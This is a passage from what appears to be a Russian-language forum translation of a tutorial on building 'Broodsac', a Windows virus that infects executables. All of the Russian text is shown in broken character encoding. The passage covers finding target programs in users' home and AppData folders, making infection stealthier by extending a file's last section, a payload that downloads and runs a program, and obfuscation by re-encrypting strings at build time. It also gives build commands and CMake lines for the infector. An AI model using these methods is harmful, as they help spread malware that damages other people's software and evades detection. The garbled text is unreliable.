–æ—Ç —Ç–æ–≥–æ, —á—Ç–æ–±—ã —Å–æ–¥–µ—Ä–∂–∞—Ç—å –¥—Ä—É–≥–∏–µ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ, —Ç–∞–∫–∏–µ –∫–∞–∫ —Ä–µ—Å—É—Ä—Å—ã –ø—Ä–æ–≥—Ä–∞–º–º—ã. –ï—Å–ª–∏ –±—ã –º—ã —Ö–æ—Ç–µ–ª–∏ –±—ã—Ç—å –±–æ–ª–µ–µ —Å–∫—Ä—ã—Ç–Ω—ã–º–∏ –≤ –æ—Ç–Ω–æ—à–µ–Ω–∏–∏ –∏–Ω—Ñ–µ–∫—Ü–∏–∏, –º—ã –º–æ–≥–ª–∏ –±—ã –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä–æ–≤–∞—Ç—å –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ä–∞–∑–¥–µ–ª—ã –∏ –ø—Ä–∏–º–µ–Ω–∏—Ç—å —Ç–µ—Ö–Ω–∏–∫—É 29A[3], —Ä–∞—Å—à–∏—Ä–∏–≤ –ø–æ—Å–ª–µ–¥–Ω–∏–π —Ä–∞–∑–¥–µ–ª –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º —Ñ–∞–π–ª–µ. –ï—Å—Ç–µ—Å—Ç–≤–µ–Ω–Ω–æ, –∫–æ–º–ø—Ä–æ–º–∏—Å—Å –≤ –Ω–µ–∑–∞–º–µ—Ç–Ω–æ—Å—Ç–∏ –∑–¥–µ—Å—å –±—É–¥–µ—Ç –∑–∞–∫–ª—é—á–∞—Ç—å—Å—è –≤ —É–º–µ–Ω—å—à–µ–Ω–∏–∏ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ–π –ø–æ–≤–µ—Ä—Ö–Ω–æ—Å—Ç–∏ –∞—Ç–∞–∫–∏ –∏ ‚Äî –≤–æ–∑–º–æ–∂–Ω–æ, –Ω–∞–º–µ—Ä–µ–Ω–Ω–æ ‚Äî —É–≤–µ–ª–∏—á–µ–Ω–∏–∏ —Å–ª–æ–∂–Ω–æ—Å—Ç–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –∏–Ω—Ñ–µ–∫—Ü–∏–∏. –í—ã–±–æ—Ä –∑–∞ –≤–∞–º–∏.<br />
<br />
–ù–∞–º –Ω—É–∂–Ω—ã —Ü–µ–ª–µ–≤—ã–µ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ñ–∞–π–ª—ã. –ì–¥–µ –º—ã –∏—Ö –Ω–∞–π–¥—ë–º? –£–¥–∏–≤–∏—Ç–µ–ª—å–Ω–æ, –≤ –¥–æ–º–∞—à–Ω–µ–º –∫–∞—Ç–∞–ª–æ–≥–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –ü—Ä–æ—à–ª–∏ –≤—Ä–µ–º–µ–Ω–∞, –∫–æ–≥–¥–∞ –∫–∞–∂–¥–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–ª–∞—Å—å –≤ –∫–∞—Ç–∞–ª–æ–≥ Program Files, —Ç–µ–ø–µ—Ä—å –Ω–∞—Å—Ç—É–ø–∏–ª–∞ —ç—Ä–∞ AppData –∏ –ø–∞–ø–∫–∏ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –≥–¥–µ –æ–Ω–∏ —Ä–∞—Å–ø–∞–∫–æ–≤—ã–≤–∞—é—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ –ø–∞–∫–µ—Ç—ã –Ω–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤. –ú—ã –º–æ–∂–µ–º –ø—Ä–æ—Å—Ç–æ —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–æ –ø–µ—Ä–µ–±–∏—Ä–∞—Ç—å –¥–æ–º–∞—à–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –ø–æ–∏—Å–∫–∞—Ö —Ü–µ–ª–µ–π.<br />
<br />
–ß—Ç–æ –∫–∞—Å–∞–µ—Ç—Å—è —Ç–æ–≥–æ, —á—Ç–æ –¥–æ–ª–∂–Ω–∞ –¥–µ–ª–∞—Ç—å –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –ø—Ä–∏ –∑–∞—Ä–∞–∂–µ–Ω–∏–∏? –Ø –ª–∏—á–Ω–æ —Ñ–∞–Ω–∞—Ç –ø—Ä–æ–µ–∫—Ç–∞ Desktop Pet[4], —Ä–∞–Ω–µ–µ –∏–∑–≤–µ—Å—Ç–Ω–æ–≥–æ –∫–∞–∫ eSheep –≤ 90-—Ö. –≠—Ç–æ –ø–æ–¥—Ö–æ–¥—è—â–∞—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞, —á—Ç–æ–±—ã –æ–∂–∏–≤–∏—Ç—å —Ç–µ—Ö–Ω–∏–∫—É –∑–∞—Ä–∞–∂–µ–Ω–∏—è –∏–∑ 90-—Ö. –û–Ω–∞ —Å–æ–∑–¥–∞—ë—Ç –æ—Ç–ª–∏—á–Ω–æ–µ –≤–∏–∑—É–∞–ª—å–Ω–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ, –µ—Å–ª–∏ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è. –ù–∞—à–∞ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –¥–æ–ª–∂–Ω–∞ –ø—Ä–æ—Å—Ç–æ —Å–∫–∞—á–∞—Ç—å (–µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç) –∏ –∑–∞–ø—É—Å—Ç–∏—Ç—å —ç—Ç—É –º–∏–ª—É—é –º–∞–ª–µ–Ω—å–∫—É—é –æ–≤–µ—á–∫—É –Ω–∞ —Ä–∞–±–æ—á–µ–º —Å—Ç–æ–ª–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –ö—Ç–æ –±—ã –æ—Ç–∫–∞–∑–∞–ª—Å—è –æ—Ç —Ç–∞–∫–æ–π –æ—á–∞—Ä–æ–≤–∞—Ç–µ–ª—å–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã, –¥–æ–ø–æ–ª–Ω—è—é—â–µ–π –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ñ–∞–π–ª—ã –º–∏–ª—ã–º –∂–∏–≤–æ—Ç–Ω—ã–º-–¥—Ä—É–≥–æ–º? –ü—Ä–æ—Å—Ç–æ–µ —Å–∫–∞—á–∏–≤–∞–Ω–∏–µ –∏ –∑–∞–ø—É—Å–∫ —ç—Ç–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –±—É–¥–µ—Ç –∏–¥–µ–∞–ª—å–Ω–æ.<br />
<br />
<b>--[ 4. –°–æ–∑–¥–∞–Ω–∏–µ –≤–∏—Ä—É—Å–∞</b><br />
<br />
–ë—ã—Å—Ç—Ä–æ –∏ –ø—Ä–æ—Å—Ç–æ, —á—Ç–æ–±—ã —Å–æ–±—Ä–∞—Ç—å Broodsac, —Ä–∞—Å–∫–æ–¥–∏—Ä—É–π—Ç–µ –∞—Ä—Ç–µ—Ñ–∞–∫—Ç—ã –≤ —Ä–∞–∑–¥–µ–ª–µ 9 <b><u>(–ò—Å—Ö–æ–¥–Ω–∏–∫ —è —Ä–∞—Å–ø–∞–∫–æ–≤–∞–ª —É–∂–µ –≤–æ –≤–ª–æ–∂–µ–Ω–∏–∏)</u></b>, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –∞—Ä—Ö–∏–≤, —Ä–∞—Å–ø–∞–∫—É–π—Ç–µ –µ–≥–æ –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç–µ —Å–ª–µ–¥—É—é—â–∏–µ –∫–æ–º–∞–Ω–¥—ã:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>$ cd broodsac
$ mkdir build
$ cd build
$ cmake ../ -A x64
$ cmake --build ./ --config Release</code></pre>
	</div>
</div><br />
–ï—Å—Ç–µ—Å—Ç–≤–µ–Ω–Ω–æ, —è –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞—é, —á—Ç–æ –≤—ã –Ω–µ –±—É–¥–µ—Ç–µ —Å—Ç–æ–ª—å –≥–ª—É–ø—ã, —á—Ç–æ–±—ã –∑–∞–ø—É—Å–∫–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç –Ω–∞ —Å–∏—Å—Ç–µ–º–µ, —Å –∫–æ—Ç–æ—Ä–æ–π –≤—ã –Ω–µ —Ö–æ—Ç–∏—Ç–µ –≤–æ–∑–∏—Ç—å—Å—è. –ï—Å–ª–∏ —Ç–æ–ª—å–∫–æ –≤—ã <i>–Ω–µ —Ö–æ—Ç–∏—Ç–µ</i> –æ–≤–µ—á–µ–∫ –≤ —Å–≤–æ–∏—Ö –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–∞—Ö, —Ç–æ–≥–¥–∞ –≤–ø–µ—Ä—ë–¥.<br />
<br />
–í–æ –≤—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è –≤–∞—à–µ–≥–æ –≤–∏—Ä—É—Å–∞ –≤—ã, –Ω–µ—Å–æ–º–Ω–µ–Ω–Ω–æ, —Å—Ç–æ–ª–∫–Ω—ë—Ç–µ—Å—å —Å –æ—à–∏–±–∫–∞–º–∏. –£—á–∏—Ç—ã–≤–∞—è, —á—Ç–æ –º—ã —Å–æ–∑–¥–∞—ë–º –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–µ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ, –º—ã –¥–æ–ª–∂–Ω—ã –∑–∞–∏–º—Å—Ç–≤–æ–≤–∞—Ç—å —Ñ–∏–ª–æ—Å–æ—Ñ–∏—é –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –ø–æ —Å–æ–∑–¥–∞–Ω–∏—é –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—é —Ç–µ—Å—Ç–æ–≤. –≠—Ç–æ –Ω–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —Ñ–æ—Ä–º–∞–ª—å–Ω—ã–µ –º–æ–¥—É–ª—å–Ω—ã–µ —Ç–µ—Å—Ç—ã, –≥–¥–µ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å –≤ –æ—Ç–¥–µ–ª—å–Ω—ã—Ö —Ç–æ—á–∫–∞—Ö –∫–æ–¥–∞, –Ω–æ –æ–Ω–∏ –¥–æ–ª–∂–Ω—ã –∫–∞–∫-—Ç–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å –≤–∞—à–µ–≥–æ –≤–∏—Ä—É—Å–∞. –£—á–∏—Ç—ã–≤–∞—è –Ω–µ—Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç—å –Ω–µ–æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω–æ–≥–æ –ø–æ–≤–µ–¥–µ–Ω–∏—è —Ü–µ–ª–µ–π, —Å –∫–æ—Ç–æ—Ä—ã–º–∏ –º—ã —Ä–∞–±–æ—Ç–∞–µ–º –≤ –Ω–∞—à–µ–π —Ç—ë–º–Ω–æ–π —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ, –≤—ã –∞–±—Å–æ–ª—é—Ç–Ω–æ –¥–æ–ª–∂–Ω—ã –¥—É–º–∞—Ç—å –æ —Ç–µ—Å—Ç–∞—Ö –Ω–∞ –ø–µ—Ä–µ–¥–Ω–µ–º –ø–ª–∞–Ω–µ.<br />
<br />
–ï—Å—Ç—å —Ç—Ä–∏ –∫–ª—é—á–µ–≤—ã—Ö –≤–æ–ø—Ä–æ—Å–∞, –∫–æ—Ç–æ—Ä—ã–µ –Ω–∞–º –Ω—É–∂–Ω–æ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ—Ç—å –¥–ª—è —Ü–µ–ª–µ–π —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è:<br />
<br />
<ul>
<li data-xf-list-type="ul">–†–∞–±–æ—Ç–∞–µ—Ç –ª–∏ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞?</li>
<li data-xf-list-type="ul">–£—Å–ø–µ—à–Ω–æ –ª–∏ –∑–∞—Ä–∞–∂–∞–µ—Ç –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—å?</li>
<li data-xf-list-type="ul">–ü—Ä–æ—Ö–æ–¥–∏—Ç –ª–∏ –∏–Ω—Ñ–µ–∫—Ü–∏—è, –Ω–µ –Ω–∞—Ä—É—à–∞—è –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è?</li>
</ul><br />
–ü–µ—Ä–≤—ã–π –≤–æ–ø—Ä–æ—Å –∏–º–µ–µ—Ç –¥–ª—è –Ω–∞—Å –¥–µ–π—Å—Ç–≤–∏–µ: –∫–∞–∫ –º—ã —ç—Ç–æ —Ç–µ—Å—Ç–∏—Ä—É–µ–º? –ï—Å—Ç–µ—Å—Ç–≤–µ–Ω–Ω–æ, –º—ã –Ω–µ –æ–±—è–∑–∞–Ω—ã –¥–µ–ª–∞—Ç—å —ç—Ç–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ ‚Äî –Ω–∞–º –ø—Ä–æ—Å—Ç–æ –Ω—É–∂–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –≤ –µ—ë —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ñ–æ—Ä–º–∞—Ö, —á—Ç–æ–±—ã —É–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ –æ–Ω–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—Å–∫–∞–µ—Ç –º–∏–ª—É—é –æ–≤–µ—á–∫—É. C–∏ –∏ Assembly –∏–º–µ—é—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ –ø–æ–¥–≤–æ–¥–Ω—ã–µ –∫–∞–º–Ω–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏, –∫–æ—Ç–æ—Ä—ã–µ —Å—Ç–∞–Ω—É—Ç –æ—á–µ–≤–∏–¥–Ω—ã –≤–æ –≤—Ä–µ–º—è —ç—Ç–æ–≥–æ –ø—Ä–æ—Å—Ç–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è. –ß—Ç–æ–±—ã —Å–æ–∑–¥–∞—Ç—å –∏ –ø—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –Ω–∞—à 64-–±–∏—Ç–Ω—ã–π payload, –Ω–∞–ø—Ä–∏–º–µ—Ä, –º—ã –º–æ–∂–µ–º –ø—Ä–æ—Å—Ç–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å–ª–µ–¥—É—é—â–∏–µ –∫–æ–º–∞–Ω–¥—ã:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>$ cd infection/asm/64
$ mkdir build
$ cd build
$ cmake ../ -DINFECTION_STANDALONE=ON -A x64
$ cmake --build ./ --config Release
$ ./Release/infection_asm_64.exe</code></pre>
	</div>
</div><br />
–ï—Å–ª–∏ –Ω–∞—à–∞ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç, –º—ã –±—É–¥–µ–º –≤–æ–∑–Ω–∞–≥—Ä–∞–∂–¥–µ–Ω—ã –º–∏–ª–æ–π –æ–≤–µ—á–∫–æ–π. –ü—Ä–æ—Å—Ç–æ–π —Ç–µ—Å—Ç.<br />
<br />
–≠—Ç–æ –ø–æ—Ö–æ–∂–µ –Ω–∞ –ø—Ä–æ—Ü–µ—Å—Å configure/make –≤ Linux. CMake –±–µ—Ä—ë—Ç —Ñ–∞–π–ª CMakeLists.txt –≤ —Ü–µ–ª–µ–≤–æ–º –∫–∞—Ç–∞–ª–æ–≥–µ –∏ —Å—Ç—Ä–æ–∏—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é –¥–ª—è –≤–∞—à–∏—Ö –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–±–æ—Ä–∫–∏. –ú—ã –Ω–∞—Å—Ç—Ä–æ–∏–ª–∏ –Ω–∞—à–∏ ASM-—Ñ–∞–π–ª—ã —Ç–∞–∫, —á—Ç–æ–±—ã –∏—Ö –º–æ–∂–Ω–æ –±—ã–ª–æ –∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞—Ç—å –∫–∞–∫ –æ—Ç–¥–µ–ª—å–Ω—ã–µ –±–∏–Ω–∞—Ä–Ω—ã–µ —Ñ–∞–π–ª—ã –¥–ª—è –∏–Ω–¥–∏–≤–∏–¥—É–∞–ª—å–Ω–æ–≥–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è, —Ç–∞–∫ –∏ –∫–∞–∫ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—è.<br />
<br />
–ë—ã–ª–∞ –≤—ã–±—Ä–∞–Ω–∞ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∞—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ –∫–∞–∫ –º–µ—Ç–æ–¥ –æ–±—ä–µ–¥–∏–Ω–µ–Ω–∏—è –Ω–∞—à–∏—Ö payload-–æ–≤ –≤ –Ω–∞—à –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª, –ø–æ—Ç–æ–º—É —á—Ç–æ —ç—Ç–æ –ø—Ä–æ—Å—Ç–æ –∏ —ç–ª–µ–≥–∞–Ω—Ç–Ω–æ, —Ç–∞–∫ –∫–∞–∫ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –±—É–¥–µ—Ç —Å–æ–≤–ø–∞–¥–∞—Ç—å. –ò–Ω—Å—Ç–∏–Ω–∫—Ç–∏–≤–Ω–æ, –º—ã –≤–∏–¥–∏–º shell-–∫–æ–¥ –∫–∞–∫ –µ–¥–∏–Ω–∏—Ü—É, –∫–æ—Ç–æ—Ä—É—é –Ω—É–∂–Ω–æ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å, –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –≤ —à–µ—Å—Ç–Ω–∞–¥—Ü–∞—Ç–µ—Ä–∏—á–Ω—É—é —Å—Ç—Ä–æ–∫—É –∏ —Å–ø—Ä—è—Ç–∞—Ç—å –≤ –∫–∞–∫–æ–º-—Ç–æ C-–∫–æ–¥–µ. –ü–æ—ç—Ç–æ–º—É –º—ã –¥–µ–ª–∞–µ–º —Å –Ω–∏–º –∫—Ä–µ–∞—Ç–∏–≤–Ω—ã–µ –≤–µ—â–∏, —Å—á–∏—Ç–∞—è –µ–≥–æ –ø—Ä–æ—Å—Ç–æ –±–ª–æ–±–æ–º –¥–∞–Ω–Ω—ã—Ö, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ –∫–∞–∫-—Ç–æ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å. –ú—ã —Å–∫–ª–æ–Ω–Ω—ã –∑–∞–±—ã–≤–∞—Ç—å, —á—Ç–æ shell-–∫–æ–¥ –º–æ–∂–µ—Ç –±—ã—Ç—å —Å–≤–æ–µ–π —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –∏–Ω–¥–∏–≤–∏–¥—É–∞–ª—å–Ω–æ–π –µ–¥–∏–Ω–∏—Ü–µ–π –∫–æ–¥–∞.<br />
<br />
–ù–æ —Å —Å–∏—Å—Ç–µ–º–æ–π —Å–±–æ—Ä–∫–∏ –Ω–∞ –≤–∞—à–µ–π —Å—Ç–æ—Ä–æ–Ω–µ, –≤—ã –º–æ–∂–µ—Ç–µ –¥–æ–ø–æ–ª–Ω–∏—Ç—å —Å–ø–æ—Å–æ–± –≤—ã—Ö–æ–¥–∞ –≤–∞—à–µ–≥–æ shell-–∫–æ–¥–∞ –Ω–∞ —ç—Ç–∞–ø–µ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏. –ü–æ—Å–ª–µ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö –∫–∞—Å—Ç–æ–º–∏–∑–∞—Ü–∏–π —Å–±–æ—Ä–∫–∏ –Ω–∞—à–µ–≥–æ payload-–∞ –≤ —Ñ–∞–π–ª–µ CMake –∑–∞—Ä–∞–∂–∞—é—â–µ–≥–æ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞, –º—ã –≤–∫–ª—é—á–∞–µ–º —ç—Ç–æ—Ç –∏ 32-–±–∏—Ç–Ω—É—é –≤–µ—Ä—Å–∏—é —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>add_subdirectory(${PROJECT_SOURCE_DIR}/infection/asm/32)
add_subdirectory(${PROJECT_SOURCE_DIR}/infection/asm/64)

add_executable(broodsac WIN32 main.c)
target_link_libraries(broodsac infection_asm_32 infection_asm_64)</code></pre>
	</div>
</div><br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –≤ –¥–æ–≤–æ–ª—å–Ω–æ —á–∏—Å—Ç–æ–º –≤–∏–¥–µ, —Å –ø—Ä–æ—Å—Ç—ã–º –Ω–∞–±–æ—Ä–æ–º –∫–ª—é—á–µ–≤—ã—Ö —Å–ª–æ–≤ &quot;extern&quot; –≤ —Ñ–∞–π–ª–µ main.c –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—è, –º—ã –≤–∫–ª—é—á–∏–ª–∏ –Ω–∞—à–∏ shell-–∫–æ–¥—ã –≤ –æ—Å–Ω–æ–≤–Ω–æ–π –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª. –•–æ—Ç—è —ç—Ç–æ –µ—â—ë –Ω–µ –ø–æ–∫–∞–∑–∞–Ω–æ, –ø–æ–º–∏–º–æ —ç—Ç–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –º—ã —Ç–∞–∫–∂–µ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞–ª–∏ —ç—Ç–∞–ø —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫ –≤–Ω—É—Ç—Ä–∏ –∫–æ–¥–∞ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, —Ç–∞–∫ —á—Ç–æ –∫–∞–∂–¥—ã–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω–∞—à–∞ —Å–±–æ—Ä–∫–∞, —Å—Ç—Ä–æ–∫–∏ –ø–µ—Ä–µ—à–∏—Ñ—Ä–æ–≤—ã–≤–∞—é—Ç—Å—è –∏ –ø–µ—Ä–µ—Å–æ–±–∏—Ä–∞—é—Ç—Å—è –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º —Ñ–∞–π–ª–µ –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—è.<br />
<br />
–ú—ã –∏–∑–±–µ–∂–∞–ª–∏ —É—Ç–æ–º–∏—Ç–µ–ª—å–Ω–æ–π –∑–∞–¥–∞—á–∏ –ø–æ —Ä—É—á–Ω–æ–º—É –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—é –Ω–∞—à–µ–≥–æ shell-–∫–æ–¥–∞ –≤ –º–∞—Å—Å–∏–≤ –∫–∞–∫–æ–≥–æ-—Ç–æ —Ä–æ–¥–∞ –∏ –¥–∞–∂–µ –¥–æ–±–∞–≤–∏–ª–∏ —à–∞–≥ –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –ø–æ –ø—É—Ç–∏. –ü—Ä–µ–ª–µ—Å—Ç—å —ç—Ç–æ–≥–æ –º–µ—Ç–æ–¥–∞ –≤ —Ç–æ–º, —á—Ç–æ –æ–Ω –∏–∑–±–µ–≥–∞–µ—Ç —Å–∫—Ä—ã—Ç—ã—Ö –æ–ø–∞—Å–Ω–æ—Å—Ç–µ–π, –∫–æ—Ç–æ—Ä—ã–µ —á–∞—Å—Ç–æ –≤–æ–∑–Ω–∏–∫–∞—é—Ç –∏–∑-–∑–∞ –±—ã—Å—Ç—Ä—ã—Ö —Ä–µ—à–µ–Ω–∏–π, –∫ –∫–æ—Ç–æ—Ä—ã–º –º—ã –ø—Ä–∏–≤—ã–∫–ª–∏. –ò –≤ –∫–æ–Ω—Ü–µ –∫–æ–Ω—Ü–æ–≤: —ç—Ç–æ –ø—Ä–æ—Å—Ç–æ —Ö–æ—Ä–æ—à–∞—è –ø—Ä–∞–∫—Ç–∏–∫–∞ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è.<br />
<br />
–í–µ—Ä–Ω—ë–º—Å—è –∫ –Ω–∞—à–∏–º –≤–æ–ø—Ä–æ—Å–∞–º. –û—Å—Ç–∞–ª—å–Ω—ã–µ –≤–æ–ø—Ä–æ—Å—ã, —Ö–æ—Ç—è –∏ –∏–º–µ—é—Ç —Ç—É –∂–µ –∑–∞–¥–∞—á—É, –∏–º–µ—é—Ç –±–æ–ª–µ–µ —Å–ª–æ–∂–Ω—ã–π –æ—Ç–≤–µ—Ç. –ù–∞–º –Ω—É–∂–Ω–æ –ø—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –∏ –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –∑–∞—Ä–∞–∂—ë–Ω–Ω—ã–µ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ñ–∞–π–ª—ã, —á—Ç–æ–±—ã –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –∏ –æ—Ç–ª–∞–¥–∏—Ç—å –∏–Ω—Ñ–µ–∫—Ü–∏–∏. –ü–æ—ç—Ç–æ–º—É –Ω–∞–º –Ω—É–∂–Ω–æ –ø–µ—Ä–µ—á–∏—Å–ª–∏—Ç—å, —á—Ç–æ –Ω—É–∂–Ω–æ 